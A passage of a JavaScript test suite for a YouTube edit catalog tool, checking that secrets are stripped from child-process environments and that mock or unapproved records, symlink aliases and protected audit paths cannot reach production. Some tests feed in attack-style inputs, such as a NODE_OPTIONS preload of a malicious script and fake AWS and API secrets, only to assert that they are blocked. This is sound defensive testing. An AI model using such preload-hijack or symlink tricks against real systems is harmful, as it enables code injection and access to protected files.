        auditFilePath: tempAuditPath,
        outputPath: tempCatalogPath,
        dryRun: false,
      });
      assert.equal(compileResult.success, false, "Production publication must reject record from global fetch replacement");
      assert.equal(existsSync(tempCatalogPath), false, "Output catalog file must not be created");
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("STAGE 1 AT-1.10: Child processes use allowlisted environments and strip secrets across named imports", () => {
  const childScript = `
    import { isTestIsolationActive, loadEnvConfig } from './scripts/youtube-api.mjs';
    const active = isTestIsolationActive();
    const loadResult = loadEnvConfig();
    const leakedKey = process.env.YOUTUBE_DATA_API_KEY;
    const leakedCustom = process.env.LEAKED_CUSTOM_SECRET;
    console.log(JSON.stringify({ active, loadResult, leakedKey, leakedCustom }));
  `;

  const child = spawnSync("node", ["--input-type=module", "-e", childScript], {
    cwd: projectRoot,
    encoding: "utf-8",
    env: {
      ...process.env,
      YOUTUBE_DATA_API_KEY: "leaked_real_secret_attempt",
      LEAKED_CUSTOM_SECRET: "should_be_stripped_by_allowlist",
    },
  });

  assert.equal(child.status, 0, child.stderr || child.stdout);
  const data = JSON.parse(child.stdout.trim());
  assert.equal(data.active, true, "Child process must inherit test isolation active flag");
  assert.equal(data.loadResult.skipped, true, "Child process loadEnvConfig must skip project root");
  assert.equal(data.leakedKey, undefined, "Child process must not receive YOUTUBE_DATA_API_KEY");
  assert.equal(data.leakedCustom, undefined, "Child process must not receive non-allowlisted environment variables");
});

test("STAGE 1 AT-1.10b: execFileSync sanitizes environment, strips NODE_OPTIONS/NODE_PATH, and hides raw ChildProcess", () => {
  assert.equal(typeof isolatedChildProcess.ChildProcess, "undefined", "Raw ChildProcess constructor must not be exposed");

  const out = isolatedChildProcess.execFileSync(
    "node",
    ["-e", "console.log(JSON.stringify(process.env))"],
    {
      encoding: "utf-8",
      env: {
        ...process.env,
        YOUTUBE_DATA_API_KEY: "execFileSync_secret_leak_attempt",
        AWS_SECRET_ACCESS_KEY: "execFileSync_aws_leak_attempt",
        NODE_OPTIONS: "--require /tmp/malicious-preload.js",
        NODE_PATH: "/tmp/malicious-modules",
        UNALLOWLISTED_VAR: "dangerous_variable",
      },
    }
  );

  const env = JSON.parse(out.trim());
  assert.equal(env.YOUTUBE_DATA_API_KEY, undefined, "execFileSync must strip YOUTUBE_DATA_API_KEY");
  assert.equal(env.AWS_SECRET_ACCESS_KEY, undefined, "execFileSync must strip AWS_SECRET_ACCESS_KEY");
  assert.equal(env.NODE_OPTIONS, undefined, "execFileSync must strip NODE_OPTIONS to prevent preload hijacking");
  assert.equal(env.NODE_PATH, undefined, "execFileSync must strip NODE_PATH");
  assert.equal(env.UNALLOWLISTED_VAR, undefined, "execFileSync must strip un-allowlisted environment variables");
  assert.equal(env.LOLIXCO_TEST_ISOLATION, "1", "execFileSync child must maintain test isolation flag");
});

test("STAGE 1 AT-1.10c: CommonJS require('child_process') is intercepted and sanitized", () => {
  const require = createRequire(import.meta.url);
  const cjsChildProcess = require("node:child_process");

  const out = cjsChildProcess.execSync('node -e "console.log(JSON.stringify(process.env))"', {
    encoding: "utf-8",
    env: {
      ...process.env,
      YOUTUBE_DATA_API_KEY: "cjs_secret_attempt",
      UNALLOWLISTED_CJS: "strip_me",
      NODE_OPTIONS: "--inspect",
    },
  });

  const env = JSON.parse(out.trim());
  assert.equal(env.YOUTUBE_DATA_API_KEY, undefined, "CommonJS child_process must strip API keys");
  assert.equal(env.UNALLOWLISTED_CJS, undefined, "CommonJS child_process must strip un-allowlisted variables");
  assert.equal(env.NODE_OPTIONS, undefined, "CommonJS child_process must strip NODE_OPTIONS");
  assert.equal(env.LOLIXCO_TEST_ISOLATION, "1", "CommonJS child_process must inherit test isolation");
});

test("STAGE 1 AT-1.11: Publication boundary test on compile-youtube-catalog.mjs (Rejection of synthetic provenance)", () => {
  const tempDir = createDisposableTempDir("lolixco-stage1-pub-");
  const tempAuditPath = join(tempDir, "synthetic-audit.json");
  const tempOutputPath = join(tempDir, "temp-edits.ts");

  const prodCatalogShaBefore = getFileSha256(resolve(projectRoot, "src/data/edits.ts"));

  try {
    const syntheticAuditData = {
      version: "1.0.0",
      generatedAt: "2026-01-01T00:00:00Z",
      items: [
        {
          canonicalVideoId: "mockVid0001",
          canonicalUrl: "https://www.youtube.com/watch?v=mockVid0001",
          assignedLolixcoId: 100,
          format: "video",
          formatConfirmed: true,
          category: "Anime",
          fandomIds: ["jujutsu-kaisen"],
          contentReviewStatus: "approved",
          isMock: true,
          provenance: "synthetic_mock",
          syntheticOrigin: "test_mock_fixture",
          metadataFetchStatus: "fetched",
          metadata: {
            title: "Synthetic Test Edit",
            description: "Mock edit description",
            channelTitle: "Mock Creator",
            durationFormatted: "1:00",
            durationSec: 60,
            isMock: true,
            provenance: "synthetic_mock",
          },
        },
      ],
    };

    writeFileSync(tempAuditPath, JSON.stringify(syntheticAuditData, null, 2), "utf-8");

    const child = spawnSync(
      "node",
      [
        "scripts/compile-youtube-catalog.mjs",
        "--audit-file", tempAuditPath,
        "--output", tempOutputPath,
        "--publish",
      ],
      {
        cwd: projectRoot,
        encoding: "utf-8",
      }
    );

    assert.equal(child.status, 1, "Compiler must exit with code 1 when attempting to publish synthetic mock metadata");

    const combinedOutput = (child.stdout || "") + (child.stderr || "");
    assert.ok(
      combinedOutput.includes("synthetic mock metadata is prohibited from production catalog publication"),
      "Error output must explicitly cite synthetic mock prohibition"
    );

    assert.equal(existsSync(tempOutputPath), false, "Compiler must not write output file when validation fails");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }

  const prodCatalogShaAfter = getFileSha256(resolve(projectRoot, "src/data/edits.ts"));
  assert.equal(prodCatalogShaBefore, prodCatalogShaAfter, "Production src/data/edits.ts must remain completely unmodified");
});

test("STAGE 1 AT-1.12: Publication boundary test on simulated/laundered official API responses", () => {
  const tempDir = createDisposableTempDir("lolixco-stage1-launder-");
  const tempAuditPath = join(tempDir, "laundered-audit.json");
  const tempOutputPath = join(tempDir, "temp-edits.ts");

  const prodCatalogShaBefore = getFileSha256(resolve(projectRoot, "src/data/edits.ts"));

  try {
    const launderedAuditData = {
      version: "1.0.0",
      generatedAt: "2026-01-01T00:00:00Z",
      items: [
        {
          canonicalVideoId: "launderVid1",
          canonicalUrl: "https://www.youtube.com/watch?v=launderVid1",
          assignedLolixcoId: 101,
          format: "video",
          formatConfirmed: true,
          category: "Anime",
          fandomIds: ["jujutsu-kaisen"],
          contentReviewStatus: "approved",
          isMock: false,
          provenance: "youtube_data_api_v3",
          metadataFetchStatus: "fetched",
          lastMetadataVerification: new Date().toISOString(),
          metadata: {
            canonicalVideoId: "launderVid1",
            title: "Curated Edit launderVid1",
            description: "High quality test #anime",
            channelId: "UC_fake_channel",
            channelTitle: "YouTube Creator",
            durationFormatted: "0:45",
            durationSec: 45,
            embeddable: true,
            privacyStatus: "public",
            isMock: false,
            provenance: "youtube_data_api_v3",
          },
        },
      ],
    };

    writeFileSync(tempAuditPath, JSON.stringify(launderedAuditData, null, 2), "utf-8");

    const child = spawnSync(
      "node",
      [
        "scripts/compile-youtube-catalog.mjs",
        "--audit-file", tempAuditPath,
        "--output", tempOutputPath,
        "--publish",
      ],
      {
        cwd: projectRoot,
        encoding: "utf-8",
      }
    );

    assert.equal(child.status, 1, "Compiler must reject simulated/laundered metadata with exit code 1");
    const combinedOutput = (child.stdout || "") + (child.stderr || "");
    assert.ok(
      combinedOutput.includes("missing genuine title metadata") ||
      combinedOutput.includes("missing genuine channel creator attribution"),
      "Error output must reject placeholder titles and channel attribution"
    );
    assert.equal(existsSync(tempOutputPath), false, "Output file must not be created");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }

  const prodCatalogShaAfter = getFileSha256(resolve(projectRoot, "src/data/edits.ts"));
  assert.equal(prodCatalogShaBefore, prodCatalogShaAfter, "Production catalog must remain completely unmodified");
});

test("STAGE 1 AT-1.12b: Production-target write guard prevents catalog writes during test mode (including symlink aliases)", async () => {
  const prodCatalogShaBefore = getFileSha256(CANONICAL_OUTPUT_PATH);
  const tempDir = createDisposableTempDir("lolixco-prod-guard-");
  const tempAuditPath = join(tempDir, "audit.json");
  const symlinkCatalogPath = join(tempDir, "symlink-edits.ts");

  try {
    const validApprovedItem = {
      canonicalVideoId: "validVid001",
      canonicalUrl: "https://www.youtube.com/watch?v=validVid001",
      assignedLolixcoId: 100,
      format: "video",
      formatConfirmed: true,
      category: "Anime",
      fandomIds: ["jujutsu-kaisen"],
      contentReviewStatus: "approved",
      isMock: false,
      provenance: "youtube_data_api_v3",
      metadataFetchStatus: "fetched",
      lastMetadataVerification: new Date().toISOString(),
      metadata: {
        canonicalVideoId: "validVid001",
        title: "Legitimate Anime Sequence AMV",
        channelTitle: "Verified Creator Studio",
        durationFormatted: "1:30",
        durationSec: 90,
        embeddable: true,
        privacyStatus: "public",
        isMock: false,
        provenance: "youtube_data_api_v3",
      },
    };

    writeFileSync(tempAuditPath, JSON.stringify({ version: "1.0.0", items: [validApprovedItem] }, null, 2), "utf-8");

    // 1. Direct write attempt to CANONICAL_OUTPUT_PATH during active test isolation
    const directResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: CANONICAL_OUTPUT_PATH,
      dryRun: false,
    });

    assert.equal(directResult.success, false, "Direct production write must be blocked under test isolation");
    assert.ok(
      directResult.errors.some((e) => e.includes("resolves to a protected production path under active test isolation")),
      "Must cite protected production path error"
    );

    // 2. Symlink alias to CANONICAL_OUTPUT_PATH must also be blocked fail-closed
    symlinkSync(CANONICAL_OUTPUT_PATH, symlinkCatalogPath);
    const symlinkResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: symlinkCatalogPath,
      dryRun: false,
    });

    assert.equal(symlinkResult.success, false, "Symlink alias write must be blocked under test isolation");
    assert.ok(
      symlinkResult.errors.some((e) => e.includes("resolves to a protected production path under active test isolation")),
      "Must detect canonical destination through symlink"
    );

    // 3. CLI --publish targeting canonical output must exit with code 1
    const cliChild = spawnSync(
      "node",
      [
        "scripts/compile-youtube-catalog.mjs",
        "--audit-file", tempAuditPath,
        "--output", CANONICAL_OUTPUT_PATH,
        "--publish",
      ],
      { cwd: projectRoot, encoding: "utf-8" }
    );
    assert.equal(cliChild.status, 1, "CLI must exit with code 1 when attempting production write in test mode");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }

  const prodCatalogShaAfter = getFileSha256(CANONICAL_OUTPUT_PATH);
  assert.equal(prodCatalogShaBefore, prodCatalogShaAfter, "Production catalog checksum must remain perfectly untouched");
});

test("STAGE 1 AT-1.12c: Intake audit and review operations on protected audit files fail closed during test mode (including dry-run and backup sources)", async () => {
  const tempProtectedDir = createDisposableTempDir("lolixco-disposable-protected-");
  const syntheticAuditPath = join(tempProtectedDir, "youtube-intake-audit.json");
  const syntheticBackupDir = join(tempProtectedDir, "backups");
  mkdirSync(syntheticBackupDir, { recursive: true });
  const syntheticBackupPath = join(syntheticBackupDir, "audit-backup.json");

  writeFileSync(syntheticAuditPath, JSON.stringify({ version: "1.0.0", records: [] }), "utf-8");
  writeFileSync(syntheticBackupPath, JSON.stringify({ version: "1.0.0", backup: true }), "utf-8");
  setProtectedRootsForTest([tempProtectedDir]);

  // Install spy to verify ZERO metadata or content operations target canonical audit paths
  let canonicalAuditAccessCount = 0;
  const originalRealpathSync = fs.realpathSync;
  const originalStatSync = fs.statSync;
  const originalLstatSync = fs.lstatSync;
  const originalReadFileSync = fs.readFileSync;

  const checkCanonicalAccess = (arg) => {
    if (typeof arg === "string" && arg.includes("content/audit")) {
      canonicalAuditAccessCount++;
    }
  };

  fs.realpathSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalRealpathSync.call(this, p, options);
  };
  fs.statSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalStatSync.call(this, p, options);
  };
  fs.lstatSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalLstatSync.call(this, p, options);
  };
  fs.readFileSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalReadFileSync.call(this, p, options);
  };
  syncBuiltinESMExports();

  try {
    // 1. Ingestion targeting protected audit path must fail closed for both normal and dry-run
    const ingestResult = await ingestYouTubeBatch({
      batchId: "test-attack-batch",
      auditFilePath: syntheticAuditPath,
      dryRun: false,
      urls: ["https://youtu.be/0vswe8D3UTk"],
    });
    assert.equal(ingestResult.success, false, "Ingestion targeting protected audit path must fail closed");
    assert.ok(ingestResult.errors.some((e) => e.includes("resolves to a protected production path")));

    const ingestDryRunResult = await ingestYouTubeBatch({
      batchId: "test-attack-batch",
      auditFilePath: syntheticAuditPath,
      dryRun: true,
      urls: ["https://youtu.be/0vswe8D3UTk"],
    });
    assert.equal(ingestDryRunResult.success, false, "Dry-run ingestion targeting protected audit path must fail closed");
    assert.ok(ingestDryRunResult.errors.some((e) => e.includes("resolves to a protected production path")));

    // 2. Review listing and inspection targeting protected audit path must fail closed
    const listResult = await listPendingReviewItems(syntheticAuditPath);
    assert.equal(listResult.success, false, "listPendingReviewItems targeting protected audit must fail closed");
    assert.ok(listResult.errors.some((e) => e.includes("resolves to a protected production path")));

    const inspectResult = await inspectReviewItem("0vswe8D3UTk", syntheticAuditPath);
    assert.equal(inspectResult.success, false, "inspectReviewItem targeting protected audit must fail closed");
    assert.ok(inspectResult.error.includes("resolves to a protected production path"));

    // 3. Catalog compilation targeting protected audit path in dry-run mode must fail closed
    const compileDryRunResult = await compileYouTubeCatalog({
      auditFilePath: syntheticAuditPath,
      dryRun: true,
    });
    assert.equal(compileDryRunResult.success, false, "Dry-run compilation targeting protected audit must fail closed");
    assert.ok(compileDryRunResult.errors.some((e) => e.includes("resolves to a protected production path")));

    // 4. Review approval targeting protected audit path must fail closed
    const approveResult = await approveReviewItem("0vswe8D3UTk", {
      auditFilePath: syntheticAuditPath,
    });
    assert.equal(approveResult.success, false, "Approval targeting protected audit path must fail closed");
    assert.ok(approveResult.errors.some((e) => e.includes("resolves to a protected production path")));

    // 5. Batch approval targeting protected audit path must fail closed
    const batchApproveResult = await approveBatch("any-batch", {
      auditFilePath: syntheticAuditPath,
    });
    assert.equal(batchApproveResult.success, false, "Batch approval targeting protected audit path must fail closed");
    assert.ok(batchApproveResult.errors.some((e) => e.includes("resolves to a protected production path")));

    // 6. Format confirmation targeting protected audit path must fail closed
    const formatResult = await confirmItemFormat("0vswe8D3UTk", "video", {
      auditFilePath: syntheticAuditPath,
    });
    assert.equal(formatResult.success, false, "Format confirmation targeting protected audit path must fail closed");

    // 7. Rejection targeting protected audit path must fail closed
    const rejectResult = await rejectReviewItem("0vswe8D3UTk", {
      auditFilePath: syntheticAuditPath,
    });
    assert.equal(rejectResult.success, false, "Rejection targeting protected audit path must fail closed");

    // 8. Direct safeAtomicWriteFileSync targeting protected audit path must throw Error
    assert.throws(
      () => {
        safeAtomicWriteFileSync(syntheticAuditPath, '{"tampered": true}');
      },
      /resolves to a protected production path/,
      "Direct write to protected audit must throw protected path error"
    );

    // 9. Backup and restore operations on protected audit paths must be blocked
    assert.throws(
      () => {
        createAuditBackup(syntheticAuditPath);
      },
      /resolves to a protected production path/,
      "createAuditBackup must block operations on protected audit path"
    );

    assert.throws(
      () => {
        restoreAuditBackup("/tmp/dummy-backup.json", syntheticAuditPath);
      },
      /resolves to a protected production path/,
      "restoreAuditBackup must block restoration into protected audit path"
    );

    // 10. Restore from protected backup source must be blocked fail-closed
    assert.throws(
      () => {
        restoreAuditBackup(syntheticAuditPath, "/tmp/dummy-target.json");
      },
      /resolves to a protected production path/,
      "restoreAuditBackup must block reading from protected audit as backup source"
    );
    assert.throws(
      () => {
        restoreAuditBackup(syntheticBackupPath, "/tmp/dummy-target.json");
      },
      /resolves to a protected production path/,
      "restoreAuditBackup must block reading from protected audit directory as backup source"
    );

    // Verify that canonical private audit filesystem metadata was NEVER touched
    assert.equal(
      canonicalAuditAccessCount,
      0,
      "Zero filesystem metadata or content calls may target canonical audit paths during fixture tests"
    );
  } finally {
    fs.realpathSync = originalRealpathSync;
    fs.statSync = originalStatSync;
    fs.lstatSync = originalLstatSync;
    fs.readFileSync = originalReadFileSync;
    syncBuiltinESMExports();
    setProtectedRootsForTest([]);
    rmSync(tempProtectedDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.12d: Draft publication constraints (allowDraft prevents unapproved leakage into production)", async () => {
  const tempDir = createDisposableTempDir("lolixco-draft-pub-");
  const tempAuditPath = join(tempDir, "audit.json");
  const tempCatalogPath = join(tempDir, "preview-edits.ts");

  try {
    const draftAuditData = {
      version: "1.0.0",
      generatedAt: "2026-01-01T00:00:00Z",
      items: [
        {
          canonicalVideoId: "draftVid001",
          canonicalUrl: "https://www.youtube.com/watch?v=draftVid001",
          assignedLolixcoId: 100,
          format: "video",
          formatConfirmed: true,
          confirmedFormat: "video",
          category: "Anime",
          fandomIds: ["jujutsu-kaisen"],
          contentReviewStatus: "embed_eligible", // Candidate unapproved draft with metadata!
          isMock: false,
          provenance: "youtube_data_api_v3",
          metadataFetchStatus: "fetched",
          lastMetadataVerification: new Date().toISOString(),
          metadata: {
            canonicalVideoId: "draftVid001",
            title: "Draft Unapproved Edit",
            channelTitle: "Creator Channel",
            durationFormatted: "1:00",
            durationSec: 60,
            embeddable: true,
            privacyStatus: "public",
            isMock: false,
            provenance: "youtube_data_api_v3",
          },
        },
      ],
    };
    writeFileSync(tempAuditPath, JSON.stringify(draftAuditData, null, 2), "utf-8");

    // 1. Without allowDraft: true, unapproved item is not compiled into catalog
    const noDraftResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: tempCatalogPath,
      allowDraft: false,
      dryRun: false,
    });
    assert.equal(noDraftResult.success, true);
    assert.equal(noDraftResult.compiledCount, 0, "Unapproved draft must NOT be compiled without allowDraft: true");

    // 2. With allowDraft: true targeting canonical production output -> BLOCKED under test isolation
    const draftProdResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: CANONICAL_OUTPUT_PATH,
      allowDraft: true,
      dryRun: false,
    });
    assert.equal(draftProdResult.success, false, "Draft preview must never write to canonical production catalog");
    assert.ok(
      draftProdResult.errors.some(
        (e) =>
          e.includes("'allowDraft' is strictly forbidden during catalog writes") ||
          e.includes("resolves to a protected production path")
      ),
      "Must reject draft compilation targeting catalog writes"
    );

    // 3. With allowDraft: true targeting temp output with dryRun: true -> allowed for preview
    const draftPreviewResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: tempCatalogPath,
      allowDraft: true,
      dryRun: true,
    });
    assert.equal(draftPreviewResult.success, true, "Draft preview to temporary output is permitted");
    assert.equal(draftPreviewResult.compiledCount, 1, "Draft preview compiles 1 candidate item");

    // 4. With allowDraft: true and dryRun: false -> strictly forbidden (drafts forbidden during writes)
    const draftWriteResult = await compileYouTubeCatalog({
      auditFilePath: tempAuditPath,
      outputPath: tempCatalogPath,
      allowDraft: true,
      dryRun: false,
    });
    assert.equal(draftWriteResult.success, false, "Drafts are forbidden during catalog writes");
    assert.ok(draftWriteResult.errors.some((e) => e.includes("'allowDraft' is strictly forbidden during catalog writes")));
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.12e: Phase 2 Blocker Regression - Protected audit read denial on batch-input file paths (direct and symlink)", async () => {
  const tempProtectedDir = createDisposableTempDir("lolixco-disposable-protected-");
  const tempWorkDir = createDisposableTempDir("lolixco-batch-audit-test-");
  const syntheticAuditSource = join(tempProtectedDir, "synthetic-private-audit.json");
  const tempAuditDest = join(tempWorkDir, "temp-destination-audit.json");
  const symlinkSource = join(tempWorkDir, "symlink-protected-audit.json");

  // Write synthetic audit file in disposable protected root
  writeFileSync(syntheticAuditSource, JSON.stringify({ privateSecretRecords: ["secret-1", "secret-2"] }), "utf-8");
  setProtectedRootsForTest([tempProtectedDir]);

  let readerCallCount = 0;
  const readerSpy = (filePath, encoding) => {
    readerCallCount++;
    return readFileSync(filePath, encoding);
  };
  setBatchFileReaderForTest(readerSpy);

  // Install spy to verify ZERO metadata or content operations target canonical audit paths
  let canonicalAuditAccessCount = 0;
  const originalRealpathSync = fs.realpathSync;
  const originalStatSync = fs.statSync;
  const originalLstatSync = fs.lstatSync;
  const originalReadFileSync = fs.readFileSync;

  const checkCanonicalAccess = (arg) => {
    if (typeof arg === "string" && arg.includes("content/audit")) {
      canonicalAuditAccessCount++;
    }
  };

  fs.realpathSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalRealpathSync.call(this, p, options);
  };
  fs.statSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalStatSync.call(this, p, options);
  };
  fs.lstatSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalLstatSync.call(this, p, options);
  };
  fs.readFileSync = function (p, options) {
    checkCanonicalAccess(p);
    return originalReadFileSync.call(this, p, options);
  };
  syncBuiltinESMExports();

  try {
    // 1. Direct path targeting protected audit as batch input must fail closed in write mode
    const directBatchResult = await ingestYouTubeBatch({
      batchId: "attack-batch-direct",
      batchFile: syntheticAuditSource,
      auditFilePath: tempAuditDest,
      dryRun: false,
    });
    assert.equal(directBatchResult.success, false, "Batch input targeting protected audit directly must fail closed");
    assert.ok(
      directBatchResult.errors.some((e) => e.includes("resolves to a protected production path")),
      "Must state batch input path resolves to a protected production path"
    );
    assert.equal(readerCallCount, 0, "Protected batch file reader must NEVER be invoked");

    // 2. Direct path targeting protected audit as batch input must fail closed in dry-run mode
    const dryRunBatchResult = await ingestYouTubeBatch({
      batchId: "attack-batch-dryrun",
      batchFile: syntheticAuditSource,
      auditFilePath: tempAuditDest,
      dryRun: true,
    });
    assert.equal(dryRunBatchResult.success, false, "Batch input targeting protected audit in dry-run must fail closed");
    assert.ok(
      dryRunBatchResult.errors.some((e) => e.includes("resolves to a protected production path")),
      "Dry-run must also block protected audit as batch input"
    );
    assert.equal(readerCallCount, 0, "Protected batch file reader must NEVER be invoked in dry-run");

    // 3. Symlink alias pointing to protected audit as batch input must be resolved and denied fail-closed
    symlinkSync(syntheticAuditSource, symlinkSource);
    const symlinkBatchResult = await ingestYouTubeBatch({
      batchId: "attack-batch-symlink",
      batchFile: symlinkSource,
      auditFilePath: tempAuditDest,
      dryRun: false,
    });
    assert.equal(symlinkBatchResult.success, false, "Batch input via symlink to protected audit must fail closed");
    assert.ok(
      symlinkBatchResult.errors.some((e) => e.includes("resolves to a protected production path")),
      "Symlink targeting protected audit must be caught and blocked"
    );
    assert.equal(readerCallCount, 0, "Protected batch file reader must NEVER be invoked for symlink alias");

    // 4. Batch input passed via string batchInput matching protected audit directly
    const stringInputResult = await ingestYouTubeBatch({
      batchId: "attack-batch-string",
      batchInput: syntheticAuditSource,
      auditFilePath: tempAuditDest,
      dryRun: false,
    });
    assert.equal(stringInputResult.success, false, "String batchInput targeting protected audit directly must fail closed");
    assert.ok(
      stringInputResult.errors.some((e) => e.includes("resolves to a protected production path")),
      "String batchInput targeting protected audit must be blocked"
    );
    assert.equal(readerCallCount, 0, "Protected batch file reader must NEVER be invoked for string batchInput");

    // Verify zero canonical audit accesses
    assert.equal(
      canonicalAuditAccessCount,
      0,
      "Zero filesystem metadata or content calls may target canonical audit paths during batch fixture tests"
    );
  } finally {
    fs.realpathSync = originalRealpathSync;
    fs.statSync = originalStatSync;
    fs.lstatSync = originalLstatSync;
    fs.readFileSync = originalReadFileSync;
    syncBuiltinESMExports();
    setProtectedRootsForTest([]);
    setBatchFileReaderForTest(null);
    rmSync(tempProtectedDir, { recursive: true, force: true });
    rmSync(tempWorkDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.13: Production catalog immutability check against git HEAD and exact demo records", () => {
  const prodCatalogPath = resolve(projectRoot, "src/data/edits.ts");

  // Verify file matches exact git HEAD commit SHA256 byte-for-byte
  const currentCatalogSha = getFileSha256(prodCatalogPath);
  const headCatalogContent = execFileSync("git", ["show", "HEAD:src/data/edits.ts"], {
    cwd: projectRoot,
    encoding: "utf-8",
  });
  const headCatalogSha = createHash("sha256").update(headCatalogContent).digest("hex");

  assert.equal(
    currentCatalogSha,
    headCatalogSha,
    "Production src/data/edits.ts SHA256 must match git HEAD commit 4f9185c exactly"
  );

  // Verify structure: exactly 17 demo edits, IDs 0-16 in sequential order
  assert.equal(edits.length, 17, "Production catalog must contain exactly 17 demo edits");
  for (let i = 0; i < 17; i++) {
    const edit = edits[i];
    assert.equal(edit.id, i, `Demo edit index ${i} must have id ${i}`);
    assert.ok(edit.title && edit.title.length > 0, `Demo edit ${i} must have title`);
    assert.ok(edit.source && edit.source.length > 0, `Demo edit ${i} must have source asset`);
    assert.ok(edit.poster && edit.poster.length > 0, `Demo edit ${i} must have poster asset`);
    assert.equal(edit.creator, "Lolixco demo", `Demo edit ${i} must have creator 'Lolixco demo'`);
  }

  // Zero portrait Shorts in demo catalog
  const shorts = edits.filter((e) => e.format === "short");
  assert.equal(shorts.length, 0, "Production catalog must have 0 Shorts before curation");

  // Zero mock markers or synthetic provenance in production catalog
  const content = readFileSync(prodCatalogPath, "utf-8");
  assert.equal(content.includes("mockVid"), false, "Production catalog must not contain mock edits");
  assert.equal(content.includes("synthetic_mock"), false, "Production catalog must not contain synthetic markers");
});

test("STAGE 1 AT-1.14: Multi-signal safety (Not relying solely on LOLIXCO_TEST_MODE)", () => {
  const savedTestMode = process.env.LOLIXCO_TEST_MODE;
  try {
    delete process.env.LOLIXCO_TEST_MODE;

    assert.equal(
      isTestIsolationActive(),
      true,
      "Test isolation must remain active through multiple redundant signals (NODE_ENV, LOLIXCO_TEST_ISOLATION, --test)"
    );

    const result = loadEnvConfig();
    assert.equal(result.skipped, true);
  } finally {
    process.env.LOLIXCO_TEST_MODE = savedTestMode;
  }
});
